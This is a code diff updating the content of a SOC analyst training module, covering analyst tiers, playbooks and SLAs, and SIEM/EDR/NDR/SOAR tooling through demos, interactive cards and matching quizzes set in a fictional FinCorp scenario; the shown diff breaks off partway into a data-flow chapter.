@@ -126,2201 +126,2887 @@ export const MODULE_04_UNITS: UnitStructure[] = [
   // UNIT 1: SOC ARCHITECTURE
   // =========================================================================
   {
-    id: 'unit-1',
-    unitNumber: 1,
-    title: 'Unit 1: SOC Architecture',
-    description: 'Master the core SOC foundation: the People, Process, and Technology triad and the end-to-end data ingestion pipeline.',
-    estimatedHours: 2,
-    topics: [
+    "id": "unit-1",
+    "unitNumber": 1,
+    "title": "Unit 1: SOC Architecture",
+    "description": "Understand the three foundational pillars (People, Process, Technology), organizational hierarchy, and enterprise telemetry data flows.",
+    "estimatedHours": 0.5,
+    "topics": [
       {
-        id: 'topic-1-1',
-        unitId: 'unit-1',
-        title: 'SOC Triad: People, Process & Technology',
-        order: 1,
-        estimatedMinutes: 20,
-        xpReward: 50,
-        theory: {
-          summaryLines: [
-            'A Security Operations Center (SOC) is the centralized cyber defense nerve center for an organization.',
-            'Just like a 911 emergency response center, a SOC relies on a triad: skilled People (analysts), defined Processes (playbooks & SLAs), and Technology (monitoring tools).',
-            'People: Tier 1 Triage Sentries triage alerts 24/7; Tier 2 Incident Hunters investigate root cause; Tier 3 Threat Hunters hunt stealthy adversaries; the SOC Manager steers operations.',
-            'Process: Standard Operating Procedures (SOPs), Playbooks, and Service Level Agreements (SLAs) ensure fast, consistent response times under pressure.',
-            'Technology: Central telemetry SIEM brains, EDR host visibility, and SOAR automated response engines work together to neutralize threats.',
+        "id": "topic-1-1",
+        "unitId": "unit-1",
+        "title": "Chapter 1: People",
+        "order": 1,
+        "estimatedMinutes": 8,
+        "xpReward": 35,
+        "theory": {
+          "summaryLines": [
+            "People represent the human analysts, engineers, and leaders who operate the Security Operations Center.",
+            "Tier 1 (Triage Analyst): Performs first-line triage, validates alerts, extracts entities, and handles initial containment within strict SLAs.",
+            "Tier 2 (Incident Responder): Conducts in-depth forensic investigation, tracks lateral movement, and executes root cause eradication.",
+            "Tier 3 (Threat Hunter / SME): Performs proactive adversary hunting, malware reverse-engineering, and builds advanced detection signatures.",
+            "SOC Lead & CISO: Directs operations, manages incident crises, ensures regulatory compliance, and reports to executive stakeholders."
           ],
-          knowMore: {
-            title: 'SANS SOC Architecture & Maturity Model',
-            description: 'Learn how modern enterprise SOCs balance human expertise, structured playbooks, and automated detection platforms.',
-            externalUrl: 'https://www.sans.org/white-papers/soc-survey/',
-            externalLabel: 'Read SANS SOC Research',
-          },
+          "knowMore": {
+            "title": "NIST SP 800-61 Rev 2: Organizing an Incident Response Capability",
+            "description": "Learn the official NIST guidelines on staffing models, tier responsibilities, and analyst skill requirements.",
+            "externalUrl": "https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final",
+            "externalLabel": "NIST SOC Staffing"
+          }
         },
-        demo: {
-          title: 'The 911 Dispatch Analogy & SOC Triad',
-          subtitle: 'Visualizing how human analysts, standard procedures, and technology platforms fuse into unified defense.',
-          steps: [
-            {
-              stepNumber: 1,
-              title: 'The Cyber Emergency Center',
-              description: 'Think of a SOC like an emergency dispatch room: thousands of sensor inputs arrive constantly, requiring quick triage to save assets.',
-              visualType: 'network',
-              highlightElements: ['soc-nerve-center', '24-7-monitoring'],
-              narration: 'A SOC operates around the clock to detect, analyze, and neutralize attacks before business harm occurs.',
-            },
-            {
-              stepNumber: 2,
-              title: 'The Three Pillars',
-              description: 'Without skilled People, tools create blind noise. Without Process, teams panic. Without Technology, humans drown in logs.',
-              visualType: 'dashboard',
-              highlightElements: ['people', 'process', 'technology'],
-              narration: 'True cyber resilience requires balance across all three pillars.',
-            },
-          ],
+        "demo": {
+                  "title": "[Demo] Meet the SOC Team",
+                  "subtitle": "Watch how alerts route through L1 Triage, L2 Incident Response, L3 Threat Hunting, and SOC Management",
+                  "steps": [
+                            {
+                                      "id": 1,
+                                      "stage": "1. The Alert Queue",
+                                      "iconName": "siem",
+                                      "title": "Incoming Alert Enters FinCorp Queue",
+                                      "description": "Security telemetry generates alert ALT-2026-04 on workstation FIN-PC-04, appearing in the centralized SOC triage queue.",
+                                      "telemetrySnippet": "QUEUE: FinCorp Triage Queue | Alert: Multiple Failed Logins | Entity: FIN-PC-04 | Status: Unassigned",
+                                      "highlightText": "The alert queue is the shared operational entry point for the entire SOC team."
+                            },
+                            {
+                                      "id": 2,
+                                      "stage": "2. Tier 1 Triage",
+                                      "iconName": "analyst",
+                                      "title": "L1 Analyst Claims Alert & Validates Activity",
+                                      "description": "L1 Analyst claims the alert, verifies the affected user (Finance01) and workstation (FIN-PC-04), and checks for active anomalies.",
+                                      "telemetrySnippet": "L1 STATUS: In Review by L1 | Target: Finance01 | Source IP: 10.10.20.15 | SLA Timer: 14m Remaining",
+                                      "highlightText": "L1 analysts handle rapid first-line qualification, entity identification, and initial triage."
+                            },
+                            {
+                                      "id": 3,
+                                      "stage": "3. Tier 2 Response",
+                                      "iconName": "server",
+                                      "title": "L2 Analyst Investigates Escalated Incidents",
+                                      "description": "When alerts show signs of compromise, L2 conducts deep investigation, examines host telemetry, and isolates affected systems.",
+                                      "telemetrySnippet": "L2 ACTION: Deep Host Telemetry Review | Active Containment | Root-Cause Trace",
+                                      "highlightText": "L2 incident responders take over complex investigations requiring host-level containment and remediation."
+                            },
+                            {
+                                      "id": 4,
+                                      "stage": "4. Tier 3 Hunting",
+                                      "iconName": "endpoint",
+                                      "title": "L3 Senior Analyst Hunts Enterprise Threats",
+                                      "description": "L3 hunts for stealthy adversary behavior, analyzes advanced threat patterns, and builds detection signatures across FinCorp.",
+                                      "telemetrySnippet": "L3 SEARCH: Fleet-Wide IOC Sweep | YARA Signature Deployed | Behavioral Correlation",
+                                      "highlightText": "L3 senior specialists proactively hunt for stealth threats that evade standard rule detections."
+                            },
+                            {
+                                      "id": 5,
+                                      "stage": "5. SOC Management",
+                                      "iconName": "analyst",
+                                      "title": "SOC Lead Coordinates Operations & Crisis",
+                                      "description": "SOC Manager oversees shift coverage, monitors queue metrics, coordinates inter-team communication, and reports to leadership.",
+                                      "telemetrySnippet": "MANAGEMENT: Shift Triage SLA: 98.4% | Escalations Active: 1 | Stakeholder Briefing Prepared",
+                                      "highlightText": "The SOC Manager ensures operational excellence, resource allocation, and executive incident reporting."
+                            }
+                  ]
         },
-        interactive: {
-          title: 'SOC Triad Blueprint Explorer',
-          scenario: 'Explore the roles and responsibilities of People, Process, and Technology in stopping an active ransomware outbreak.',
-          cards: [
-            {
-              id: 'card-people',
-              title: 'People (The Defense Force)',
-              source: 'Tiering Structure',
-              timestamp: 'Role Definition',
-              category: 'host',
-              summary: 'L1 Sentries handle 15-minute triage; L2 Hunters scope lateral movement; L3 Specialists conduct malware analysis and hunting.',
-              details: [
-                { label: 'Tier 1 Focus', value: 'Queue hygiene, false-positive filtering, alert validation' },
-                { label: 'Tier 2 Focus', value: 'Forensic host scoping, reverse engineering, containment' },
-                { label: 'Tier 3 Focus', value: 'Proactive adversary hunting, root-cause threat intelligence' },
-              ],
-              isSuspicious: false,
-              relevanceScore: 95,
-              tags: ['People', 'Tiers', 'Triage'],
-            },
-            {
-              id: 'card-process',
-              title: 'Process (The Rules of Engagement)',
-              source: 'Standard Operating Procedures',
-              timestamp: 'Execution Guidelines',
-              category: 'user',
-              summary: 'Repeatable playbooks and SLAs mandate exact steps for phishing, ransomware, credential abuse, and DDoS attacks.',
-              details: [
-                { label: 'SLA Guarantee', value: 'Critical alerts must be triaged within 15 minutes' },
-                { label: 'Playbook Benefit', value: 'Eliminates guesswork during high-stress crisis moments' },
-              ],
-              isSuspicious: false,
-              relevanceScore: 90,
-              tags: ['Process', 'SLA', 'Playbooks'],
-            },
-            {
-              id: 'card-tech',
-              title: 'Technology (The Defensive Arsenal)',
-              source: 'Security Stack',
-              timestamp: 'Sensor Network',
-              category: 'network',
-              summary: 'SIEM aggregates logs; EDR monitors processes and memory on workstations; SOAR executes automatic containment scripts.',
-              details: [
-                { label: 'SIEM Role', value: 'Correlation engine aggregating cloud, network, and endpoint logs' },
-                { label: 'EDR Role', value: 'Deep host inspection, process tree tracing, remote isolation' },
-              ],
-              isSuspicious: false,
-              relevanceScore: 92,
-              tags: ['Technology', 'SIEM', 'EDR'],
-            },
-          ],
+        "interactive": {
+                  "title": "[Interactive] Who Handles What?",
+                  "scenario": "Assign each SOC operational responsibility to the correct team role: L1 Analyst, L2 Analyst, L3 / Senior Analyst, or SOC Manager.",
+                  "cards": [
+                            {
+                                      "id": "ev-t1",
+                                      "category": "User",
+                                      "label": "Initial Alert Triage",
+                                      "summary": "First-line review, entity validation, and preliminary qualification within strict SLA timers.",
+                                      "detailedFindings": "L1 triage analysts claim unassigned alerts, extract key entities (User, Host, IP), and determine whether activity warrants closure or escalation.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "ev-t2",
+                                      "category": "Source IP",
+                                      "label": "Deep Investigation & Containment",
+                                      "summary": "Host-level forensics, process analysis, and coordinated remediation.",
+                                      "detailedFindings": "L2 incident responders perform in-depth analysis of confirmed threats, contain affected systems, and eliminate adversary foothold.",
+                                      "severityIndicator": "Suspicious"
+                            },
+                            {
+                                      "id": "ev-t3",
+                                      "category": "Event ID",
+                                      "label": "Advanced Technical Threat Hunting",
+                                      "summary": "Proactive adversary hunting, malware analysis, and detection engineering.",
+                                      "detailedFindings": "L3 senior analysts develop custom detections, analyze suspicious binary files, and sweep enterprise telemetry for stealth indicators.",
+                                      "severityIndicator": "Malicious"
+                            },
+                            {
+                                      "id": "ev-mgr",
+                                      "category": "Timeline",
+                                      "label": "SOC Operations Coordination",
+                                      "summary": "Shift governance, SLA monitoring, and executive incident communication.",
+                                      "detailedFindings": "The SOC Manager coordinates resources across shifts, leads crisis communication during major incidents, and maintains audit compliance.",
+                                      "severityIndicator": "Normal"
+                            }
+                  ]
         },
-        socContext: {
-          title: 'Real-World SOC Deployment',
-          scenario: 'At 03:00 AM on Sunday, a global manufacturing enterprise experiences an unauthorized domain controller sync attempt.',
-          analystMindset: 'Technology flagged the behavioral anomaly, the process dictated an immediate P1 bridge, and the analyst confirmed the threat and isolated the attacker.',
-          bestPractices: [
-            'Never rely on automated tools alone; human context confirms intent.',
-            'Regularly update playbooks after every major post-incident review.',
-            'Maintain strict SLA tracking to prevent alert queue stagnation.',
-          ],
+        "socContext": {
+          "title": "The Human Element: Avoiding Burnout",
+          "scenario": "A Tier 1 analyst reviews 500 alerts per shift without break, leading to alert fatigue and a missed ransomware intrusion.",
+          "analystMindset": "Security operations is a marathon, not a sprint. Proper shift rotations, automated triage assistance, and continuous learning keep analysts sharp.",
+          "bestPractices": [
+            "Take scheduled breaks during long monitoring shifts to maintain vigilance.",
+            "Collaborate with team members during ambiguous or complex investigations.",
+            "Flag recurring noisy alerts for tuning to reduce unnecessary queue burden."
+          ]
         },
-        knowledgeCheck: {
-          matching: {
-            title: 'Match the Triad Element to its Function',
-            instructions: 'Pair each pillar with its core responsibility in the SOC.',
-            pairs: [
-              { id: 'triad-1', left: 'People', right: 'Triage alerts, conduct investigations, and decide containment actions' },
-              { id: 'triad-2', left: 'Process', right: 'Playbooks and SLAs that ensure consistent, repeatable response' },
-              { id: 'triad-3', left: 'Technology', right: 'SIEM, EDR, and SOAR tools collecting and correlating telemetry' },
-              { id: 'triad-4', left: 'SOC Manager', right: 'Oversees operational metrics, team staffing, and executive briefings' },
+        "knowledgeCheck": {
+          "matching": {
+            "title": "Match SOC Roles to Responsibilities",
+            "instructions": "Match each SOC role with its primary duty.",
+            "pairs": [
+              {
+                "id": "r1",
+                "left": "Tier 1 Triage Analyst",
+                "right": "First-line alert review, entity extraction, and host isolation"
+              },
+              {
+                "id": "r2",
+                "left": "Tier 2 Incident Responder",
+                "right": "Deep memory forensics, attack path analysis, and eradication"
+              },
+              {
+                "id": "r3",
+                "left": "Tier 3 Threat Hunter",
+                "right": "Proactive adversary hunting and malware reverse engineering"
+              },
+              {
+                "id": "r4",
+                "left": "SOC Manager",
+                "right": "Operational governance, SLA management, and CISO reporting"
+              }
             ],
-            explanation: 'The triad operates synergistically: People execute Processes powered by Technology.',
-          },
-        },
+            "explanation": "Tier 1 triages and contains; Tier 2 investigates and eradicates; Tier 3 reverses malware and hunts; Managers lead governance."
+          }
+        }
       },
       {
-        id: 'topic-1-2',
-        unitId: 'unit-1',
-        title: 'Data Flow & Telemetry Ingestion Pipeline',
-        order: 2,
-        estimatedMinutes: 25,
-        xpReward: 50,
-        theory: {
-          summaryLines: [
-            'Security operations depends on real-time telemetry from across the entire corporate infrastructure.',
-            'The data flow journey: Host & network events are generated on endpoints, collected by local lightweight agents (e.g. Sysmon, Winlogbeat, Osquery).',
-            'Forwarders transport raw logs across corporate firewalls to collectors and message brokers (e.g. Kafka).',
-            'Normalizers and parsers convert disparate vendor formats into a standardized schema (such as Elastic Common Schema - ECS or CIM).',
-            'The SIEM ingests normalized logs, indexes them for high-speed queries, runs correlation rules, and pushes alerts into the analyst queue.',
+        "id": "topic-1-2",
+        "unitId": "unit-1",
+        "title": "Chapter 2: Process",
+        "order": 2,
+        "estimatedMinutes": 7,
+        "xpReward": 35,
+        "theory": {
+          "summaryLines": [
+            "Process establishes standard operating procedures, investigation workflows, and response playbooks.",
+            "Standard Operating Procedures (SOPs) provide step-by-step instructions for daily operations and routine tasks.",
+            "Incident Response Playbooks define the precise investigative actions required for specific threat categories (Phishing, Ransomware, Brute Force).",
+            "Service Level Agreements (SLAs) set time-bound response and resolution standards (e.g. 15-minute response for Critical alerts).",
+            "Without repeatable processes, investigation quality varies widely between analysts, creating dangerous security gaps."
           ],
-          knowMore: {
-            title: 'Elastic Common Schema (ECS) Reference',
-            description: 'Explore how standardizing log field names enables correlation across thousands of different security vendors.',
-            externalUrl: 'https://www.elastic.co/guide/en/ecs/current/index.html',
-            externalLabel: 'Browse ECS Documentation',
-          },
+          "knowMore": {
+            "title": "SANS Institute: Incident Response Playbooks",
+            "description": "Learn how standard playbooks create repeatable, audit-ready triage procedures across enterprise security teams.",
+            "externalUrl": "https://www.sans.org/white-papers/38580/",
+            "externalLabel": "SANS Playbook Guide"
+          }
         },
-        demo: {
-          title: 'The Real-Time Telemetry Pipeline',
-          subtitle: 'From local keyboard event to SIEM triage alert in under 2 seconds.',
-          steps: [
-            {
-              stepNumber: 1,
-              title: 'Endpoint Event Generation',
-              description: 'An employee executes a command; the OS kernel records Event ID 4688 / Sysmon Event ID 1.',
-              visualType: 'terminal',
-              highlightElements: ['endpoint', 'event-generation'],
-              narration: 'Every process spawn and network socket is recorded at the endpoint level.',
-            },
-            {
-              stepNumber: 2,
-              title: 'Ingestion & Correlation',
-              description: 'The forwarder streams the event to the SIEM, where correlation rules trigger an analyst alert within seconds.',
-              visualType: 'network',
-              highlightElements: ['forwarder', 'siem-parser', 'alert-queue'],
-              narration: 'Normalization allows the detection engine to evaluate malicious behavioral patterns.',
-            },
-          ],
+        "demo": {
+                  "title": "[Demo] An Alert's Journey",
+                  "subtitle": "Follow an alert as it moves step-by-step through the standard SOC operational lifecycle",
+                  "steps": [
+                            {
+                                      "id": 1,
+                                      "stage": "1. Alert Received",
+                                      "iconName": "siem",
+                                      "title": "Alert Ingested Into Triage Queue",
+                                      "description": "FinCorp SIEM generates an alert after correlation rules detect anomalous authentication activity.",
+                                      "telemetrySnippet": "STAGE 1: Ingestion | Rule: Multiple Failed Logins | Queue: Tier 1 Active Queue",
+                                      "highlightText": "The alert journey begins the instant correlation detection triggers in the SIEM."
+                            },
+                            {
+                                      "id": 2,
+                                      "stage": "2. Triage",
+                                      "iconName": "analyst",
+                                      "title": "Analyst Verifies Initial Scope",
+                                      "description": "L1 analyst claims the alert, reads the trigger conditions, and extracts target entities.",
+                                      "telemetrySnippet": "STAGE 2: Triage | Analyst: Assigned | Entity: Finance01 (FIN-PC-04) | Initial SLA: Active",
+                                      "highlightText": "Triage determines whether the alert represents a legitimate security concern or false alarm."
+                            },
+                            {
+                                      "id": 3,
+                                      "stage": "3. Investigation",
+                                      "iconName": "server",
+                                      "title": "Correlating Supporting Telemetry",
+                                      "description": "Analyst reviews chronological evidence, checks source IP reputation, and verifies user context.",
+                                      "telemetrySnippet": "STAGE 3: Investigation | Timeline Analyzed | Context: User called helpdesk regarding password typo",
+                                      "highlightText": "Investigation looks beyond the alert banner to uncover what actually transpired."
+                            },
+                            {
+                                      "id": 4,
+                                      "stage": "4. Document",
+                                      "iconName": "endpoint",
+                                      "title": "Recording Audit-Proof Findings",
+                                      "description": "Analyst documents the findings, evidence sources, employee verification, and timeline in the ticket.",
+                                      "telemetrySnippet": "STAGE 4: Documentation | Findings Logged | Evidence Attached | Root Cause: User Typo",
+                                      "highlightText": "Clear documentation ensures operational continuity and provides a verifiable audit trail."
+                            },
+                            {
+                                      "id": 5,
+                                      "stage": "5. Escalate / Close",
+                                      "iconName": "analyst",
+                                      "title": "Final Ticket Disposition",
+                                      "description": "Alert is classified as a Benign False Positive and closed, or packaged with evidence and escalated to L2.",
+                                      "telemetrySnippet": "STAGE 5: Disposition | Classification: False Positive (User Error) | Ticket: Closed",
+                                      "highlightText": "Every alert resolves into an informed disposition: closure with rationale or escalation with evidence."
+                            }
+                  ]
         },
-        interactive: {
-          title: 'Pipeline Latency & Tuning Simulator',
-          scenario: 'Interact with the pipeline parameters to observe how ingestion lag and normalization errors impact threat detection.',
-          cards: [
-            {
-              id: 'card-agent',
-              title: 'Endpoint Agent (Forwarder)',
-              source: 'Workstation Fleet',
-              timestamp: 'T+0.2s',
-              category: 'host',
-              summary: 'Lightweight agent capturing Sysmon telemetry and batching events securely over TLS.',
-              details: [
-                { label: 'Buffer Size', value: '50 MB local ring buffer' },
-                { label: 'Transmission Delay', value: '0.4 seconds' },
-              ],
-              isSuspicious: false,
-              relevanceScore: 88,
-              tags: ['Agent', 'Telemetry', 'Sysmon'],
-            },
-            {
-              id: 'card-parser',
-              title: 'Log Parser & Normalizer',
-              source: 'Logstash / Ingest Node',
-              timestamp: 'T+0.8s',
-              category: 'network',
-              summary: 'Translates raw syslog into standardized fields: `process.name`, `source.ip`, and `user.name`.',
-              details: [
-                { label: 'Schema Standard', value: 'Elastic Common Schema (ECS)' },
-                { label: 'Parse Failure Rate', value: '< 0.01%' },
-              ],
-              isSuspicious: false,
-              relevanceScore: 92,
-              tags: ['Parser', 'ECS', 'Normalization'],
-            },
-            {
-              id: 'card-siem',
-              title: 'SIEM Correlation Engine',
-              source: 'Detection Engine',
-              timestamp: 'T+1.4s',
-              category: 'user',
-              summary: 'Matches normalized event stream against 450+ active detection rules to trigger actionable alerts.',
-              details: [
-                { label: 'Rule Evaluated', value: 'Suspicious PowerShell Spawn from Office App' },
-                { label: 'Alert Generation', value: 'Instant push to L1 analyst queue' },
-              ],
-              isSuspicious: true,
-              relevanceScore: 98,
-              tags: ['SIEM', 'Correlation', 'Alert'],
-            },
-          ],
+        "interactive": {
+                  "title": "[Interactive] Build the SOC Workflow",
+                  "scenario": "Arrange the shuffled SOC process stages in their correct operational sequence from receipt to resolution.",
+                  "cards": [
+                            {
+                                      "id": "wf-1",
+                                      "category": "Timeline",
+                                      "label": "Stage 1: Receive",
+                                      "summary": "Alert arrives in the centralized queue from the SIEM correlation engine.",
+                                      "detailedFindings": "Alert appears in the unified dashboard with initial severity and timestamp.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "wf-2",
+                                      "category": "User",
+                                      "label": "Stage 2: Understand",
+                                      "summary": "Identify the trigger, affected user, host asset, and source IP.",
+                                      "detailedFindings": "Analyst reads the rule definition and extracts target entities.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "wf-3",
+                                      "category": "Event ID",
+                                      "label": "Stage 3: Investigate",
+                                      "summary": "Examine chronological event logs and organizational context.",
+                                      "detailedFindings": "Correlate authentication logs and verify if user had legitimate reason for activity.",
+                                      "severityIndicator": "Suspicious"
+                            },
+                            {
+                                      "id": "wf-4",
+                                      "category": "Source IP",
+                                      "label": "Stage 4: Document",
+                                      "summary": "Record findings, evidence citations, and actions taken.",
+                                      "detailedFindings": "Write clear, concise investigation notes adhering to SOC ticketing standards.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "wf-5",
+                                      "category": "Timeline",
+                                      "label": "Stage 5: Escalate / Close",
+                                      "summary": "Apply final disposition: resolve benign ticket or escalate verified threat.",
+                                      "detailedFindings": "Close with justification or transfer cleanly to L2 Incident Response.",
+                                      "severityIndicator": "Normal"
+                            }
+                  ]
         },
-        socContext: {
-          title: 'The Danger of Ingestion Lag',
-          scenario: 'A network bottleneck caused log ingestion delays of 45 minutes on web server logs.',
-          analystMindset: 'During that 45-minute blind spot, an attacker successfully uploaded a web shell and dumped credentials before the first alert reached the queue.',
-          bestPractices: [
-            'Continuously monitor ingestion latency metrics; alerts older than 5 minutes indicate pipeline congestion.',
-            'Ensure all forwarders have local disk caching to prevent log loss during network disconnects.',
-            'Standardize on common schemas (ECS/CIM) so search queries work identically across all log sources.',
-          ],
+        "socContext": {
+          "title": "Process Consistency During High-Stress Breaches",
+          "scenario": "During an active malware outbreak, an analyst panics and begins unplugging network cables without documenting host IDs or saving RAM.",
+          "analystMindset": "In high-pressure crises, rely on the playbook. Trusting proven processes prevents errors and ensures evidence is preserved.",
+          "bestPractices": [
+            "Follow playbook steps in order rather than skipping ahead.",
+            "Document every step taken directly into the investigation ticket.",
+            "Submit recommendations to update playbooks when new attacker techniques are encountered."
+          ]
         },
-        knowledgeCheck: {
-          dragDrop: {
-            title: 'Order the Telemetry Pipeline Stages',
-            instructions: 'Arrange the stages in order from event creation to analyst screen.',
-            items: [
-              { id: 'p1', label: '1. Endpoint Event Spawn (Sysmon Event ID 1)', category: 'Stage 1' },
-              { id: 'p2', label: '2. Forwarder Agent Transmission over TLS', category: 'Stage 2' },
-              { id: 'p3', label: '3. Log Parser & Field Normalization (ECS)', category: 'Stage 3' },
-              { id: 'p4', label: '4. SIEM Correlation Rule Match & Queue Alert', category: 'Stage 4' },
+        "knowledgeCheck": {
+          "matching": {
+            "title": "Match Process Types to Purpose",
+            "instructions": "Match each process element with its role.",
+            "pairs": [
+              {
+                "id": "pr1",
+                "left": "Incident Playbook",
+                "right": "Step-by-step technical procedures for specific threat types"
+              },
+              {
+                "id": "pr2",
+                "left": "Standard Operating Procedure",
+                "right": "Daily operational guidelines for shift management and triage"
+              },
+              {
+                "id": "pr3",
+                "left": "Service Level Agreement (SLA)",
+                "right": "Contractual deadlines for alert response and incident containment"
+              },
+              {
+                "id": "pr4",
+                "left": "Escalation Matrix",
+                "right": "Decision rules governing when to transfer tickets to higher tiers"
+              }
             ],
-            explanation: 'Logs originate at endpoints, travel via forwarders, are normalized by parsers, and trigger SIEM alerts.',
-          },
-        },
+            "explanation": "Playbooks govern specific threats, SOPs govern daily operations, SLAs set response timers, and escalation matrices control handoffs."
+          }
+        }
       },
+      {
+        "id": "topic-1-3",
+        "unitId": "unit-1",
+        "title": "Chapter 3: Technology",
+        "order": 3,
+        "estimatedMinutes": 8,
+        "xpReward": 35,
+        "theory": {
+          "summaryLines": [
+            "Technology provides the visibility, analytics, detection, and automation platforms required to monitor enterprise assets.",
+            "SIEM (Security Information & Event Management): Aggregates, correlates, and analyzes security logs from across the enterprise in real time.",
+            "EDR (Endpoint Detection & Response): Continuously monitors endpoint process, file, and network activity with live isolation capabilities.",
+            "NDR (Network Detection & Response): Inspects raw wire traffic, captures PCAPs, and detects lateral movement or C2 beaconing.",
+            "SOAR (Security Orchestration, Automation & Response): Executes automated playbooks to enrich alerts, query threat intel, and block malicious IPs."
+          ],
+          "knowMore": {
+            "title": "Gartner Magic Quadrant for Security Information and Event Management",
+            "description": "Learn how modern SIEM, EDR, and SOAR tools integrate into unified XDR architectures.",
+            "externalUrl": "https://www.gartner.com/reviews/market/security-information-and-event-management",
+            "externalLabel": "Gartner SIEM Guide"
+          }
+        },
+        "demo": {
+                  "title": "[Demo] The SOC Toolset",
+                  "subtitle": "See how telemetry from endpoints, networks, email, and identity flows into the analyst's toolset",
+                  "steps": [
+                            {
+                                      "id": 1,
+                                      "stage": "1. Security Sources",
+                                      "iconName": "endpoint",
+                                      "title": "Enterprise Telemetry Generation",
+                                      "description": "Workstations, network firewalls, email gateways, and Active Directory log activity across FinCorp.",
+                                      "telemetrySnippet": "SOURCES: FIN-PC-04 (Endpoint) | Edge Firewall (Network) | M365 (Email) | Entra ID (Identity)",
+                                      "highlightText": "Diverse telemetry sources provide the raw visibility necessary to detect threats."
+                            },
+                            {
+                                      "id": 2,
+                                      "stage": "2. SIEM Platform",
+                                      "iconName": "siem",
+                                      "title": "Centralized Log Search & Correlation",
+                                      "description": "The SIEM aggregates logs from all enterprise sources, normalizes timestamps, and applies detection rules.",
+                                      "telemetrySnippet": "SIEM: Ingesting 12,000 EPS | Correlation Active: Rule 104 (Failed Login Spike)",
+                                      "highlightText": "The SIEM correlates signals across different systems to identify attacks that single tools miss."
+                            },
+                            {
+                                      "id": 3,
+                                      "stage": "3. EDR (Endpoint Detection)",
+                                      "iconName": "server",
+                                      "title": "Deep Host Telemetry & Isolation",
+                                      "description": "EDR agents capture running process trees, network sockets, and provide one-click host isolation.",
+                                      "telemetrySnippet": "EDR: FIN-PC-04 Online | Sensor v8.2 | Process Tree Monitored | Host Isolation: Ready",
+                                      "highlightText": "EDR gives analysts immediate visibility and containment control directly on user workstations."
+                            },
+                            {
+                                      "id": 4,
+                                      "stage": "4. Network & Email Defenses",
+                                      "iconName": "attacker",
+                                      "title": "Perimeter & Inbound Protection",
+                                      "description": "Next-generation firewalls inspect network traffic while email gateways detonate suspicious attachments.",
+                                      "telemetrySnippet": "NETWORK/EMAIL: Perimeter Inbound Pass | Email Gateway: Clean | Port Inspection: Active",
+                                      "highlightText": "Perimeter tools defend the border and generate crucial network flow telemetry."
+                            },
+                            {
+                                      "id": 5,
+                                      "stage": "5. Case Management",
+                                      "iconName": "analyst",
+                                      "title": "Ticketing & Investigation Tracking",
+                                      "description": "Centralized case management where the analyst documents findings, tracks SLA timers, and manages cases.",
+                                      "telemetrySnippet": "TICKETING: Case #2026-881 Opened | Assigned: L1 Analyst | SLA: 30m | Status: Investigating",
+                                      "highlightText": "Case management systems preserve institutional memory and track incident lifecycles."
+                            }
+                  ]
+        },
+        "interactive": {
+                  "title": "[Interactive] Which Tool Helps?",
+                  "scenario": "Match each practical investigation need to the appropriate SOC technology category.",
+                  "cards": [
+                            {
+                                      "id": "tool-siem",
+                                      "category": "Event ID",
+                                      "label": "SIEM (Security Information & Event Management)",
+                                      "summary": "Used to search, aggregate, and correlate security logs across the enterprise.",
+                                      "detailedFindings": "Best suited when you need to run historical queries, cross-correlate firewall and authentication events, and detect patterns.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "tool-edr",
+                                      "category": "User",
+                                      "label": "EDR (Endpoint Detection & Response)",
+                                      "summary": "Used to inspect process executions and isolate compromised endpoints.",
+                                      "detailedFindings": "Best suited when verifying what parent processes spawned on a workstation or containing an infected host remotely.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "tool-net",
+                                      "category": "Source IP",
+                                      "label": "Firewall / Network Monitoring",
+                                      "summary": "Used to inspect network traffic flows and block malicious IP connections.",
+                                      "detailedFindings": "Best suited when checking outbound connection attempts, protocol anomalies, and enforcing perimeter IP blocks.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "tool-case",
+                                      "category": "Timeline",
+                                      "label": "Case Management / Ticketing",
+                                      "summary": "Used to manage investigations, assign tasks, and maintain audit records.",
+                                      "detailedFindings": "Best suited for logging evidence, tracking SLA response deadlines, and coordinating handoffs between analyst tiers.",
+                                      "severityIndicator": "Normal"
+                            }
+                  ]
+        },
+        "socContext": {
+          "title": "The Single Pane of Glass Reality",
+          "scenario": "An analyst relies entirely on SIEM alerts without ever checking EDR or network telemetry, missing an in-memory attack.",
+          "analystMindset": "No single tool provides 100% visibility. Correlate host EDR logs with network NDR traffic and perimeter firewalls for complete truth.",
+          "bestPractices": [
+            "Pivot from SIEM alerts directly into EDR consoles to inspect process execution trees.",
+            "Cross-check external IPs against proxy and firewall logs to verify data egress volume.",
+            "Leverage SOAR automated enrichment to save time during initial alert triage."
+          ]
+        },
+        "knowledgeCheck": {
+          "matching": {
+            "title": "Match Security Technologies to Primary Capabilities",
+            "instructions": "Match each security platform to its core strength.",
+            "pairs": [
+              {
+                "id": "tc1",
+                "left": "SIEM",
+                "right": "Centralized log aggregation, normalization, and cross-source correlation"
+              },
+              {
+                "id": "tc2",
+                "left": "EDR",
+                "right": "Host-level process monitoring, memory inspection, and network isolation"
+              },
+              {
+                "id": "tc3",
+                "left": "NDR",
+                "right": "Wire traffic analysis, protocol inspection, and packet capture"
+              },
+              {
+                "id": "tc4",
+                "left": "SOAR",
+                "right": "Automated playbook orchestration, enrichment, and rapid containment actions"
+              }
+            ],
+            "explanation": "SIEM correlates logs; EDR monitors and isolates endpoints; NDR inspects wire traffic; SOAR automates repetitive actions."
+          }
+        }
+      },
+      {
+        "id": "topic-1-4",
+        "unitId": "unit-1",
+        "title": "Chapter 4: Data Flow & SOC Architecture Demo",
+        "order": 4,
+        "estimatedMinutes": 7,
+        "xpReward": 50,
+        "theory": {
+          "summaryLines": [
+            "Security data flow traces the path from raw activity on an asset to actionable intelligence on an analyst dashboard.",
+            "Step 1: Endpoints, servers, firewalls, and SaaS apps generate raw logs (e.g. Syslog, Windows Event Logs).",
+            "Step 2: Universal Forwarders or Log Shippers compress, encrypt, and transmit logs to central collection indexers.",
+            "Step 3: The SIEM parses fields (user, IP, process, timestamp), normalizes them to an OSSEM/CIM schema, and indexes them.",
+            "Step 4: Real-time correlation engines evaluate rules against incoming logs and fire high-fidelity alerts when thresholds or patterns are matched."
+          ],
